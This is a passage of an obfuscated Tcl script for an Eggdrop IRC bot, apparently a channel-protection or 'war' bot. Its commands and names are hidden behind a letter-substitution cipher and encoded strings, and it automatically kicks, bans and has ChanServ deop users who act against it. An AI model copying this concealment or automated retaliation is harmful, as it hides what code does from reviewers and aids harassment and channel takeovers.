puthlp "MLGRXV ~$nick ~:~$notc ~MlG RM ~$chantarget"
}
proc [lines "nht_wvelrxv"] {nick uhost hand rest} {
global notc botnick owner
set [lines "xszmgzitvg"] [lindex $rest 0]
set [lines "mrxpgzitvg"] [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {($chantarget == "") || ($nicktarget == "")} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: wvelrxv <#xszm> <Mrxp>"
return 0
}
if {[isop $botnick $chantarget]!=1} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlG LK XSzMMVO ~$chantarget"
return 0
}
if {![onchan $nicktarget $chantarget]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$nicktarget ~rh mlg lm gsv xszmmvo."
}
if {![isvoice $nicktarget $chantarget]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$nicktarget ~rh mlg elrxv lm XSzMMVO ~$chantarget"
}
if {$nicktarget == $owner} {
puthlp "MLGRXV ~$nick ~:~$notc ~R xzmg wvelrxv nb ldmvi."
return 0
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
putserv "mode $x -v $nicktarget"
return 0
}
}
puthlp "MLGRXV ~$nick ~:~$notc ~MlG RM ~$chantarget"
}
set kickcounter "scripts/kicks.dat"
bind kick - * prot:kick
proc [lines "kilg:prxp"] {nick uhost handle chan knick reason} {
global notc notd botnick ps kickme notb notm bannick igflood botname quick is_m op_it is_ban iskick bankey kickcounter
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {[string match "* *" $reason] || [string match "*$notm*" $reason]} {
set igflood($nick) "1"
}
if {[info exists iskick($knick$chan)]} {
unset iskick($knick$chan)
}
if {$nick == $botnick} {
    if {![file exists $kickcounter]} { set file [open $kickcounter w] ; puts $file 1 ; catch {close $file} }
    set file [open $kickcounter r] ; set currentkicks [gets $file] ; catch {close $file} ; set file [open $kickcounter w] 
    puts $file [expr $currentkicks + 1] ; catch {close $file}
if {[info exists kickme($knick)]} { 
if {$kickme($knick) == 1} {
set kickme($knick) 2
}
if {$kickme($knick) == 3} {
catch { unset kickme($knick) }
}
}
if {[string match "*$notm*" $reason]} {
if {![info exists bannick($knick)]} { return 0 }
if {[info exists is_ban($bannick($knick)$chan)]} { return 0 }
set is_ban($bannick($knick)$chan) 1
if {$bannick($knick) == "*!*@*"} { return 0 }
set [lines "xnlwv"] [getchanmode $chan]
if {$bankey == "T" } {
if {![string match "*m*" $cmode] && ![string match "*k*" $cmode]} {
putsrv "nlwv ~$chan ~-p 4u.i.l.a.v.m"
putsrv "nlwv ~$chan ~+ynpI ~$bannick($knick) ~zOl\DzrMr.#~[unixtime]~"
if {![string match "*set_-R $chan*" [utimers]]} { utimer 35 [list set_-R $chan] }
if {![string match "*set_-k $chan*" [utimers]]} { utimer 25 [list set_-k $chan] }
return 0
}
if {[string match "*m*" $cmode] && ![string match "*k*" $cmode]} {
putsrv "nlwv ~$chan ~-p 4u.i.l.a.v.m"
putsrv "nlwv ~$chan ~+yp ~$bannick($knick) ~zOl\DzrMr.#~[unixtime]~"
if {![string match "*set_-R $chan*" [utimers]]} { utimer 35 [list set_-R $chan] }
if {![string match "*set_-k $chan*" [utimers]]} { utimer 25 [list set_-k $chan] }
return 0
}
if {![string match "*m*" $cmode] && [string match "*k*" $cmode]} {
putsrv "nlwv ~$chan ~+ynI ~$bannick($knick)"
if {![string match "*set_-R $chan*" [utimers]]} { utimer 35 [list set_-R $chan] }
return 0
}
if {[string match "*m*" $cmode] && [string match "*k*" $cmode]} {
putsrv "nlwv ~$chan ~+yI ~$bannick($knick)"
if {![string match "*set_-R $chan*" [utimers]]} { utimer 35 [list set_-R $chan] }
return 0
}
}
set [lines "lp_n"] "1"
if {[info exists is_m($chan)]} {
set [lines "lp_n"] "0"
}
if {[isutimer "set_-m $chan"]} {
set [lines "lp_n"] "0"
}
if {[string match "*m*" $cmode]} {
set [lines "lp_n"] "0"
}
if {$ok_m == "1"} {
set is_m($chan) 1
if {$quick == "1"} {
putquick "mode $chan +bm $bannick($knick)"
} {
putserv "mode $chan +bm $bannick($knick)"
}
} {
if {$quick == "1"} {
putquick "mode $chan +b $bannick($knick)"
} {
putserv "mode $chan +b $bannick($knick)"
}
}
return 0
} {
if {![info exists bannick($knick)]} { return 0 }
if {$bannick($knick) == "*!*@*"} { return 0 }
putserv "mode $chan +b $bannick($knick)"
if {[string match "*4BaNNEd14: 3 MINUTES*" $reason]} { utimer 180 [list unbanq $chan $bannick($knick)] }
}
return 0
}
if {$nick == $knick} { return 0 }
if {$nick == "ChanServ"} { return 0 }
if {[matchattr $nick f]} { return 0 }
if {[string match "* *" $reason] || [string match "*$notm*" $reason]} { return 0 }
if {$knick == $botnick} {
if {[info exists kickme($nick)]} { 
set kickme($nick) 3
if {[string tolower $chan] != [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} {
putsrv "XszmHvie wvlk ~$chan ~~$nick"
}
} {
if {[matchattr $cflag D]} {
set kickme($nick) 1
}
}
puthlp "QLRM ~$chan"
return 0
}
if {![isop $botnick $chan]} { return 0 }
if {$knick == $notb} {
putserv "KICK $chan $nick :$notc 14DonT KIcK 4F4R1S14..!"
set op_it($knick) 1
return 0
}
if {$knick == $ps} {
putserv "KICK $chan $nick :$notc 14DonT KIcK 4alowaini14..!"
set op_it($knick) 1
return 0
}
if {[matchattr $knick n]} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~14ZWnRM 4PRxP14 KIlGvxGRlM4..!"
set op_it($knick) 1
return 0
}
if {[matchattr $knick m]} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~14NzhGvI 4PRxP14 KIlGvxGRlM4..!"
set op_it($knick) 1
return 0
}
}
proc [lines "fmyzmj"] {chan host} {
global botnick
if {[isop $botnick $chan]} {
puthelp "mode $chan -b $host"
}
}
set [lines "otrwc"] 0
proc [lines "otimw"] {} {
global lgidx notc
set [lines "otrwc"] [incr lgidx]
if {$lgidx == 1} {
set lgrnd [dezip "/LePD/hKOJz.SqEeI.BYZn7/JKlgX.fPo/A0UhPyK/prkIz/"]
} elseif {$lgidx == 2} {
set lgrnd [dezip "2kGVd.RexG81gU6Iu/QmQtx1JKlgX.fPo/A0UhPyK/prkIz/"]
} elseif {$lgidx == 3} {
set lgrnd [dezip "vD3Je0RZEc41ADL/B.orrGh.JKlgX.fPo/A0UhPyK/prkIz/"]
} elseif {$lgidx == 4} {
set lgrnd [dezip "wlges1fjnRU/VL5p/0k5Gfl1JKlgX.fPo/A0UhPyK/prkIz/"]
} elseif {$lgidx == 5} {
set lgrnd [dezip "b.CBB/LvmdA.c3oPO1iuNEG0P9KQu/AcN/n1QXtX3/xW.jT1"]
} elseif {$lgidx == 6} {
set lgrnd [dezip ".VOm31hovTe0c3oPO1iuNEG0KBVn9.g/M51.QXtX3/xW.jT1"]
} elseif {$lgidx == 7} {
set lgrnd [dezip "vmKud0XuRFp/c3oPO1iuNEG0dtVZJ/GW1ta1QXtX3/xW.jT1"]
} elseif {$lgidx == 8} {
set [lines "otimw"] [dezip "UMNhP1.RQzx0ah1aW.XzCb0.JKlgX.fPo/A0UhPyK/prkIz/"]
} elseif {$lgidx == 9} {
set [lines "otimw"] [dezip "Ddg40.HrzfH06.z431TmZWy0JKlgX.fPo/A0UhPyK/prkIz/"]
} elseif {$lgidx == 10} {
set [lines "otimw"] [dezip "..NFq1lKJxr0LTexn.eQGAf0JKlgX.fPo/A0UhPyK/prkIz/"]
} elseif {$lgidx == 11} {
set [lines "otimw"] [dezip "uw5CS0KrJtG1ah1aW.XzCb0.ZA0Ij1s0qXr.UhPyK/prkIz/"]
} elseif {$lgidx == 12} {
set [lines "otimw"] [dezip "lSF4g./lt.P/ah1aW.XzCb0.WDqQl//siAa/UhPyK/prkIz/"]
} elseif {$lgidx == 13} {
set [lines "otimw"] [dezip "gkaMa0Vi4Qz0ah1aW.XzCb0.yhFZE.Ujz5A0UhPyK/prkIz/"]
} elseif {$lgidx == 14} {
set [lines "otimw"] [dezip "W8w3a.k8pao1ah1aW.XzCb0.E7Mnd1so9aA1UhPyK/prkIz/"]
} elseif {$lgidx == 15} {
set [lines "otimw"] [dezip "bvyAd/zgdDF/c3oPO1iuNEG0t7WZk.gU4JD1QXtX3/xW.jT1"]
} elseif {$lgidx == 16} {
set [lines "otimw"] [dezip "LYDIz/7kAgi1c3oPO1iuNEG0mFpst/ZbgVH/QXtX3/xW.jT1"]
} elseif {$lgidx == 17} {
set [lines "otimw"] [dezip "PBp27/5V/U11c3oPO1iuNEG072a75/ARbGA0QXtX3/xW.jT1"]
} elseif {$lgidx == 18} {
set [lines "otimw"] [dezip "81hEn1u081H/ah1aW.XzCb0.gs0LW1eT18T0UhPyK/prkIz/"]
} elseif {$lgidx == 19} {
set [lines "otimw"] [dezip "UCALu0gS7ON1ah1aW.XzCb0.iqUm3/sE79K.UhPyK/prkIz/"]
} elseif {$lgidx == 20} {
set [lines "otimw"] [dezip "WUlom0M1gL90ah1aW.XzCb0.cuQIr/hMfhQ/UhPyK/prkIz/"]
} else {
set lgidx 0
set lgrnd [dezip "uw5CS0KrJtG1M9IZ3/AI6QX0T7QpE0EbZvj/o/eYM0l6RaE1HnvwX0v3T5F/UfxnE0vHWHE."]
}
}
set [lines "yzmxlfmgvi"] {
"4GeTLosT14..!"
"4GeTOuT14..!"
"4BaNnEd14..!"
"4LaMeR14..!"
"4abUsEd14..!"
"4OuT14..!"
"4sUx14..!"
"13Secure Kick1..!"
"10Failure1..!"
"10BaNnEd1..!"
"10Out From Channel1..!"
"13Justice Kick1..!"
"10Anti Lamer1..!"
"13No Comments1..!"
"..2Lamer.."
"..2Out 2From 2Channel.."
"..2Justice 2Kick.."
"..2Anti 2Lamer.."
"..2Secure 2Kick.."
"..2Enemy 2Kick.."
"..2No 2Comments.."
"..2Slow 2Kick.."
"..2Smart 2Kick.."
"..2Do 2Not 2Come 2Back 2Again.."
"..2You 2Are 2In 2My 2Enemy 2List.."
"..2What 2You 2See 2Is 2What 2You 2Get.."
"..2No 2Problem.."
"..2Killing 2Zone.."
"..2Script 2Error.."
"..2Illegal.."
"..2Failure.."
"..2Fair.."
"..2Retry.."
"..2Bandit.."
"..2Terorist.."
"..2Kick.."
"..2No 2Reason.."
"..2Join 2Again.."
"..2War 2Zone.."
}
set [lines "yzmxlfmgv"] {
"14GeTLosT4..!"
"14GeTOuT4..!"
"14BaNnEd4..!"
"14LaMeR4..!"
"14abUsEd4..!"
"14OuT4..!"
"14sUx4..!"
"13Weww1..!"
"10Failure1..!"
"10BaNnEd1..!"
"10Out From Channel1..!"
"13Justice Kick1..!"
"10Anti Lamer1..!"
"13No Comments1..!"
"..2Lamer.."
"..2Out 2From 2Channel.."
"..2Justice 2Kick.."
"..2Anti 2Lamer.."
"..2Secure 2Kick.."
"..2Enemy 2Kick.."
"..2No 2Comments.."
"..2Slow 2Kick.."
"..2Smart 2Kick.."
"..2Do 2Not 2Come 2Back 2Again.."
"..2You 2Are 2In 2My 2Enemy 2List.."
"..2What 2You 2See 2Is 2What 2You 2Get.."
"..2No 2Problem.."
"..2Killing 2Zone.."
"..2Script 2Error.."
"..2Illegal.."
"..2Failure.."
"..2Fair.."
"..2Retry.."
"..2Bandit.."
"..2Terorist.."
"..2Kick.."
"..2No 2Reason.."
"..2Join 2Again.."
"..2War 2Zone.."
}
set [lines "xbxov_izmwln"] {
"14CYCLE"
"14ReJoIN"
"14IN/OuT"
"14ReHaSH"
"14ReLoAD"
"14ReFReSH"
"14C-Y-C-L-E"
"14P-A-T-R-O-L"
"14R-E-J-O-I-N"
"14S-E-A-R-C-H"
"Auto Recycle!"
"Looking for Inviter!"
"In/Out!"
"Rehashing!"
"Refreshing!"
"Doing Cycle!"
"Inviter Suspect!"
"Looking for Suspect!"
"Regain Inviter!"
"Regain Suspect!"
"Recycle!"
"Cycle Needed!"
"Cycle all Channel!"
"Cycling!"
"Inviter Detected!"
"Full Cycle Ahead!"
"Going Out and Back!"
"I can do this all day!"
"Cycle Time!"
"I will do this all day!"
"Time to Kill!"
"No day without cycle!"
"yuhuu.. where are you?"
"It's a good day to die!"
"Time for cycle!"
"License to Kill!"
"Cycle.. cycle.. and cycle.."
"I need suspect!"
"Need For Suspect!"
"Time's up!"
"No way out!"
"No more left!"
"No regret for inviter!"
"Hot Pursuit!"
"Rule No.96: Cycle!"
"Critical Cycle!"
"Pursue Inviter Suspect!"
"Go To Cycle!"
"Cycle System Running!"
"Cycle Strike Back!"
"I need cycle now!"
}
## kickcounter 
bind pub n `+kickcounter pub_+kickcounter
proc pub_+kickcounter {nick uhost hand chan rest} {
  global notc kops
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set kcounter "T"
  setuser "config" XTRA "KCOUNTER" "ON"
  puthlp "NOTICE $nick :$notc KIcK COuNTeR \[9ON\]"
  saveuser
}
bind pub n `-kickcounter pub_-kickcounter
proc pub_-kickcounter {nick uhost hand chan rest} {
  global notc kops
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  catch { unset kcounter }
  setuser "config" XTRA "KCOUNTER" "OFF"
  puthlp "NOTICE $nick :$notc KIcK COuNTeR \[4OFF\]"
  saveuser
} 
set [lines "yzmrwc"] 1
proc [lines "yzmnht"] {} {
global banidx bancounter kickcounter
set banidx [incr banidx]
set counter [open $kickcounter r]; set currentkicks [gets $counter]; catch {close $counter}; set kicks [expr $currentkicks]
if {$banidx >= [llength $bancounter]} {
set banidx 1
}
set banmsg [lindex $bancounter $banidx]
if {[getuser "config" XTRA "KCOUNTER"]=="ON"} {
append banmsg ") (4\[14$kicks4\]" 

}
return $banmsg
}
proc banms {} { 
global banidx bancounte kickcounter
set banidx [incr banidx]
set counter [open $kickcounter r]; set currentkicks [gets $counter]; catch {close $counter}; set kicks [expr $currentkicks]
if {$banidx >= [llength $bancounte]} {
set banidx 1
}
set banms [lindex $bancounte $banidx]
if {[getuser "config" XTRA "KCOUNTER"]=="ON"} {
append banms ") (04¡14$kicks04!"
} 
return $banms 
}
proc [lines "xbxovnht"] {} {
global cycidx cycle_random
set cycidx [incr cycidx]
if {$cycidx >= [llength $cycle_random]} { 
set [lines "xbxrwc"] 1
}
set [lines "xbxovnht"] [lindex $cycle_random $cycidx]
}
proc [lines "yzm_xsp"] {nick uhost handle channel mchange bhost} {
global botnick botname ps quick notb notc bannick ban-time igflood invme ex_flood
set [lines "nslhg"] [string range $bhost [string first "@" $bhost] end]
set [lines "xuozt"] "c$channel"
set [lines "xuozt"] [string range $cflag 0 8]
if {[info exists invme($mhost)]} {
catch { unset invme($mhost) }
}
if {[info exists ex_flood($mhost)]} {
catch { unset ex_flood($mhost) }
}
if {![isop $botnick $channel]} { return 0 }
set [lines "yzmnzhp"] "*!*[string range $uhost [string first "@" $uhost] end]"
if {$banmask == "*!*@*"} {
set [lines "yzmnzhp"] "$nick!*@*"
}
if {$bhost == "*!*@*"} {
utimer [rand 4] [list unbanq $channel $bhost]
return 1
}
set [lines "xnlwv"] [getchanmode $channel]
if {[getuser "config" XTRA "IPG"] != ""} {
foreach ipg [getuser "config" XTRA "IPG"] {
if {[string match $ipg $bhost] || [string match $bhost $ipg]} {
if {![isutimer "IPG $bhost"]} {
if {![string match "*k*" $cmode]} {
puthelp "mode $channel -kb 4IpgUaRd $bhost"
} {
puthelp "mode $channel -b $bhost"
}
utimer 60 [list putlog "IPG $bhost"]
}
return 1
}
}
}
if {[string match [string tolower $bhost] [string tolower $botname]]} {
if {![matchattr $nick f] && $nick != $botnick && $nick != "ChanServ" && ![string match "*dal.net*" $nick] && ![info exists igflood($nick)]} {
if {[matchattr $cflag D]} {
if {$quick == "1"} {
putqck "PRXP ~$channel ~~$nick ~:~$notc ~14HvOU 4YzMMRMt14 WvUvMhV IVeVIhRMt ~[banmsg]~"
} {
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~14HvOU 4YzMMRMt14 WvUvMhV IVeVIhRMt ~[banmsg]~" 
}
}
if {![string match "*k*" $cmode]} {
if {$quick == "1"} {
putquick "mode $channel -kb+b 4SeLF.UnBaN $bhost $banmask"
} {
putserv "mode $channel -kb+b 4SeLF.UnBaN $bhost $banmask"
}
} {
if {$quick == "1"} {
putquick "mode $channel -b+b $bhost $banmask"
} {
putserv "mode $channel -b+b $bhost $banmask"
}
}
} { 
if {![string match "*k*" $cmode]} {
if {$quick == "1"} {
putquick "mode $channel -kb 4SeLF.UnBaN $bhost"
} else {
putserv "mode $channel -kb SeLF.UnBaN $bhost"
}
} {
if {$quick == "1"} {
putquick "mode $channel -b $bhost"
} else {
putserv "mode $channel -b $bhost"
}
}
}
return 1
}
foreach knick [chanlist $channel] {
if {[string match [string tolower $bhost] [string tolower $knick![getchanhost $knick $channel]]]} {
if {[matchattr $knick f]} {
if {$knick != $ps && $knick != $notb} { utimer [rand 4] [list unbanq $channel $bhost] }
if {[matchattr $nick f] || $nick == $botnick || $nick == "ChanServ" || [string match "*dal.net*" $nick] || [info exists igflood($nick)]} { return 1 }
}
if {$knick == $notb} {
if {$nick != $botnick} {
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~14WlmG YzMmVw 4U4I1H14..!"
if {![string match "*k*" $cmode]} {
putserv "mode $channel -kb 4F4R1S.GuaRd $bhost"
} {
putserv "mode $channel -b $bhost"
}
} {
putserv "mode $channel -b $bhost"
}
return 1
}
if {$knick == $ps} {
if {$nick != $botnick} {
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~14WlmG YzMmVw 4zOlDzrMr14..!"
if {![string match "*k*" $cmode]} {
putserv "mode $channel -kb 4aLoWaiNi.GuaRd $bhost"
} {
putserv "mode $channel -b $bhost"
}
} {
putserv "mode $channel -b $bhost"
}
return 1
}
if {[matchattr $knick n]} {
if {$nick != $botnick} {
set bannick($nick) $banmask
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~14WlmG YzMmVw ZWnRM 4~$knick14..!"
}
return 1
}
if {[matchattr $knick m]} {
if {$nick != $botnick} {
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~14WlmG YzMmVw NzhGvI 4~$knick14..!"
}
return 1
}
if {[matchattr $cflag E]} {
if {$nick == $botnick} {
set [lines "nvmulixv"] [rand 4]
if {$menforce == 1} {
putsrv "PRXP ~$channel ~~$knick ~:~$notc ~14YzMmVw UIlN 4~[string trimleft $channel "#"]~ ~[banms]~"
} elseif {$menforce == 2} {
putsrv "PRXP ~$channel ~~$knick ~:~$notc ~14NzGxS YzMh UIlN 4~[unsix $bhost]~ ~[banms]~"
} elseif {$menforce == 3} {
putsrv "PRXP ~$channel ~~$knick ~:~$notc ~14UROGvI YzMh UIlN 4~[unsix $bhost]~ ~[banms]~"
} else {
putsrv "PRXP ~$channel ~~$knick ~:~$notc ~14IvUfhVw ORmP UIlN 4~[string trimleft $channel "#"]~ ~[banms]~"
}
} else {
if {[matchattr $nick n]} {
putsrv "PRXP ~$channel ~~$knick ~:~$notc ~4ZWnRM14 YzMmVw 4LfG14..!"
} else {
if {[matchattr $nick m]} {
putsrv "PRXP ~$channel ~~$knick ~:~$notc ~4NzhGvI14 YzMmVw 4LfG14..!"
} else {
if {[isop $knick $channel] && ![matchattr $nick f]} { return 1 }
if {![matchattr $knick f]} {
set [lines "nvmulixv"] [rand 5]
if {$menforce == 1} {
putsrv "PRXP ~$channel ~~$knick ~:~$notc ~14YzMmVw YB 4@~$nick ~~[banms]~"
} elseif {$menforce == 2} {
putsrv "PRXP ~$channel ~~$knick ~:~$notc ~14NzGxS YzMh UIlN 4~[unsix $bhost]~ ~[banms]~"
} elseif {$menforce == 3} {
putsrv "PRXP ~$channel ~~$knick ~:~$notc ~14YzMmVw UIlN 4~[string trimleft $channel "#"]~ ~[banms]~"
} elseif {$menforce == 4} {
putsrv "PRXP ~$channel ~~$knick ~:~$notc ~14UROGvI YzMh UIlN 4~[unsix $bhost]~ ~[banms]~"
} else {
putsrv "PRXP ~$channel ~~$knick ~:~$notc ~14IvUfhVw ORmP UIlN 4~[string trimleft $channel "#"]~ ~[banms]~"
}
}
}
}
}
}
}
}
return 0
}
bind mode - * prot:deop
proc [lines "kilg:wvlk"] {nick uhost handle channel mchange {opnick ""}} {

global botnick deopme ps invme virus_nick quick notb notc bannick lastkey unop igflood is_m op_it bankey
set [lines "xuozt"] "c$channel"
set [lines "xuozt"] [string range $cflag 0 8]
set [lines "nlwv"] [lindex $mchange 0]
if {$opnick == ""} {
set [lines "lkmrxp"] [lindex $mchange 1]
}
if {$mode == "-m"} {
foreach x [utimers] {
if {[string match "*set_-m $channel*" $x] || [string match "*TRAFFIC $channel*" $x]} {
killutimer [lindex $x 2]
}
}
catch {unset is_m($channel)}
if {![botisop $channel]} { return 0 }
if {[matchattr $cflag V]} {
foreach x [chanlist $channel] {
if {$x != $botnick && ![isvoice $x $channel] && ![isop $x $channel] && ![matchattr $x O]} {
set [lines "xivg"] [getuser $cflag XTRA "VC"]
foreach ct [utimers] {
if {[string match "*voiceq*" $ct]} {
if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} {
set [lines "xivg"] [expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]]
}
}
}
utimer $cret [list voiceq $channel $x]
}
}
}
return 0
}
if {$mode == "-R"} {
if {$nick != $botnick} {
foreach x [utimers] {
if {[string match "*set_-R $channel*" $x]} {
killutimer [lindex $x 2]
}
}
}
return 0
}
if {$mode == "+k"} {
set [lines "ozhgpvb"] $opnick
if {[matchattr $cflag K] && [matchattr $nick Z]} {
putlog "key change to $opnick"
setuser $cflag XTRA "CI" [zip $opnick]
saveuser
}
}
if {$mode == "-k"} {
catch { unset lastkey }
if {$nick != $botnick} {
set igflood($nick) "1"
}
return 0
}
if {$mode == "+m"} {
foreach x [utimers] {
if {[string match "*set_-m $channel*" $x] || [string match "*voiceq $channel*" $x] || [isutimer "advq $channel"]} {
killutimer [lindex $x 2]
}
}
if {$nick == $botnick} {
if {$bankey == "T"} {
puthelp "NOTICE $channel :Heavy violence! 60/30/15 Sec's (+mkR)"
} {
puthelp "NOTICE $channel :Heavy violence! 1 minute (+m)"
}
if {![string match "*set_-m $channel*" [utimers]]} { utimer 60 [list set_-m $channel] }
if {![string match "*m*" [lindex [channel info $channel] 0]]} {
if {[string match "*+shared*" [channel info $channel]]} {
puthelp "NOTICE $channel :OnE MInUtE MoDeRaTe DuE tO FLoOd..!"
}
utimer 70 [list set_-m $channel]
if {[isutimer "TRAFFIC $channel"]} {
utimer 20 [list pub_nobot "*" "*" "*" $channel "*"]
return 0
}
}
} {
if {[isutimer "goback"]} {
catch { clearqueue all }
foreach x [utimers] {
if {[string match "*del_nobase*" $x]} { killutimer [lindex $x 2] }
if {[string match "*goback*" $x]} { killutimer [lindex $x 2] ; goback }
}
utimer 2 del_nobase
return 0
}
utimer [expr 1800 + [rand 60]] [list set_-m $channel]
}
return 0
}
if {$mode == "+R"} {
if {$nick == $botnick} {
if {![string match "*set_-R $channel*" [utimers]]} { utimer 15 [list set_-R $channel] }
}
return 0
}
if {$mode == "+b"} {
if {$opnick == "*!*@heavy.join.flood.channel.temporary.moderate"} {
utimer 40 [list putlog "TRAFFIC $channel"]
if {$nick == $botnick} {
utimer 40 [list putserv "mode $channel -b *!*@heavy.join.flood.channel.temporary.moderate"]
if {[info exists is_m($channel)]} { return 0 }
if {$quick == "1"} {
putquick "mode $channel +m"
} {
putserv "mode $channel +m"
}
set is_m($channel) 1
return 0
}
}
ban_chk $nick $uhost $handle $channel $mchange $opnick
return 0
}
if {$mode == "-b"} {
if {[info exists is_ban($opnick$channel)]} {
catch {unset is_ban($opnick$channel)}
}
if {[isutimer "unbanq $channel $opnick"]} {
foreach x [utimers] {
if {[string match "*unbanq $channel $opnick*" $x]} {
killutimer [lindex $x 2]
}
}
}
foreach x [ignorelist] {
if {[lindex $x 0] == $opnick} {
unsetignore [lindex $x 0]
return 0
}
} 
catch { killban $opnick }
return 0
}
if {$nick == $opnick} { return 0 }
if {$opnick == $botnick && $mode == "+o"} {
chk_on_op $channel
return 0
}
if {$mode == "+o" && [isop $botnick $channel]} {
if {[info exists op_it($opnick)]} { 
catch {unset op_it($opnick)}
}
if {[matchattr $opnick O]} {
set [lines "xnlwv"] [getchanmode $channel]
if {![string match "*k*" $cmode]} {
puthelp "mode $channel -ko 4No@p.LIsT $opnick"
} {
puthelp "mode $channel -o $opnick"
}
return 0
}
if {[info exists unop($opnick)]} {
if {$nick == "ChanServ"} {
catch { unset unop($opnick) }
return 0 
}
if {[matchattr $opnick f] || [matchattr $nick f] || $nick == $botnick} {
return 0 
}
utimer [expr 5 + [rand 10]] [list unallowed $channel $nick $opnick]
return 0
}
}
if {$mode == "-o"} {
foreach x [utimers] {
if {[string match "*unallowed $channel $opnick*" $x]} { killutimer [lindex $x 2] }
}
if {$opnick == $botnick} {
if {[isutimer "DEOP $channel"]} { return 0 }
foreach x [utimers] {
if {[string match "*gop $channel*" $x]} { killutimer [lindex $x 2] }
}
utimer 2 [list putlog "DEOP $channel"]
if {![matchattr $nick f] && $nick != "ChanServ" && ![string match "*dal.net*" $nick] && ![string match "*Guest*" $botnick]} {
if {![info exists igflood($nick)]} {
if {[matchattr $cflag D]} {
set [lines "wvlknv"] $nick
}
}
}
if {![matchattr $nick m]} {
if {[string tolower $channel] != [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} {
if {![string match "*+protectfriends*" [channel info $channel]]} {
putlog "!Log! CHaNOP <<$channel>>"
putsrv "XszmHvie lk ~$channel ~~$botnick"
}
}
}
return 0
}
if {![isop $botnick $channel]} { return 0 }
if {[isutimer "deopprc*$opnick"]} {
foreach x [utimers] {
if {[string match "*deopprc*$opnick*" $x]} {
putlog "!UnDeOp OR UnKIcK!"
catch { killutimer [lindex $x 2] }
}
}
}
if {$nick == "ChanServ" && [matchattr $opnick o]} {
voiceq $channel $opnick
return 0
}
if {$nick == "ChanServ"} {
set unop($opnick) "1"
return 0 
}
if {[matchattr $nick f] || $nick == $botnick} { return 0 }
if {$nick == "ChanServ"} { return 0 }
if {$opnick == $ps} {
if {![info exists igflood($nick)]} {
putserv "KICK $channel $nick :$notc 14DonT De@p 4F4R1S14..!"
}
opq $channel $opnick
return 0
}
if {[matchattr $opnick n]} {
if {![info exists igflood($nick)]} {
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~14ZWnRM 4Wv@k14 TfzIw4..!"
opq $channel $opnick
}
return 0
}
if {[matchattr $opnick m]} {
if {![info exists igflood($nick)]} {
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~14NzhGvI 4Wv@k14 TfzIw14..!"
opq $channel $opnick
}
return 0
}
if {[matchattr $opnick o]} {
opq $channel $opnick
return 0
}
if {$opnick == $notb} {
if {![info exists igflood($nick)]} {
putserv "KICK $channel $nick :$notc 14DonT De@p 4alowaini14..!"
}
opq $channel $opnick
return 0
}
}
}
proc [lines "fmzooldvw"] {chan nick opnick} {
if {![botisop $chan]} { return 0 }
if {![isop $nick $chan]} { return 0 }
if {[isop $opnick $chan]} { return 0 }
putserv "mode $chan -ko 4ChanServ.UnaLLowEd $nick"
}
bind nick - * chk_nicks
proc [lines "xsp_mrxph"] {unick uhost hand chan newnick} {
global notc bannick botnick nick
if {$unick == $nick && $unick != $botnick} {
putsrv "MRXP ~$nick"
}
if {[matchattr $unick Q]} {
chattr $unick -Q
foreach x [getuser $unick HOSTS] {
delhost $unick $x
}
set [lines "slhgnzhp"] "${unick}!*@*"
setuser $unick HOSTS $hostmask
saveuser
}
if {![isop $botnick $chan]} { return 0 }
if {[isutimer "deopprc*$unick"]} {
foreach x [utimers] {
if {[string match "*deopprc*$unick*" $x]} {
putlog "!UnDeOp!"
catch { killutimer [lindex $x 2] }
}
}
}
if {[string match "Guest*" $newnick]} { 
if {[matchattr $unick f]} { return 0 }
if {[isop $newnick $chan]} { 
utimer [expr 80 + [rand 20]] [list deopprc $chan $newnick] 
return 0
}
}
if {[matchattr $newnick O] && [isop $newnick $chan]} { 
set [lines "xnlwv"] [getchanmode $chan]
if {![string match "*k*" $cmode]} {
putserv "mode $chan -ko 4No@p.LIsT $newnick"
} {
putserv "mode $chan -o $newnick" 
}
}
akick_chk $newnick $uhost $chan
spam_chk $newnick $uhost $hand $chan
return 0
}
proc [lines "nht_rwvmgrub"] {nick uhost hand rest} {
global notc 
set [lines "rw"] [lindex $rest 0]
set [lines "kzhhdliw"] [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {($id == "") || ($password == "")} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: rwvmgrub <mrxp> <kzhhdliw>"
return 0
}
putsrv "MrxpHvie rwvmgrub ~$id ~~$password"
puthlp "MLGRXV ~$nick ~:~$notc ~Rwvmgrub gl ~$id"
return 0
}
proc [lines "kfy_ivzomrxp"] {unick uhost hand chan rest} {
global notc keep-nick nick
if {![matchattr $unick Q]} {
puthlp "MLGRXV ~$unick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "pvvk-mrxp"] 1
putsrv "MRXP ~$nick"
return 0
}
proc [lines "izmwh"] {length} {
set [lines "xszih"] \\^|_[]{}\\
set [lines "xlfmg"] [string length $chars]
for {set i 0} {$i < $length} {incr i} {
append result [string index $chars [rand $count]]
}
return $result
}
proc [lines "kfy_izmwmrxp"] {unick uhost hand chan rest} {
global notc keep-nick nick altnick botnick
if {$rest != ""} {
set [lines "pvvk-mrxp"] 0
